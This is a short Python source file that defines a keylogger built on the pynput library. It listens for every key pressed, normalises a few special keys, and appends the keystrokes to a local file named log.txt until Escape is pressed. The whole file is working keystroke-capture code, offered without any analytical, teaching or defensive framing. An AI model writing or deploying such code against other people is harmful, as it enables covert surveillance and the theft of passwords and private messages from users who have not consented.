
from pynput.keyboard import Listener
def keylog():
    def log_keystroke(key):
        with open("log.txt", 'a') as f:
            key = str(key).replace("'", "")

            if key == 'Key.space':
                key = ' '
            if key == 'Key.shift':
                key = ''
            if key == 'Key.backspace':
                key = ''    
            if key == "Key.enter":
                key = '\n'
            if key == "Key.esc":

                f.close()
                exit()    

            f.write(key)

    with Listener(on_press=log_keystroke) as l:
        l.join()
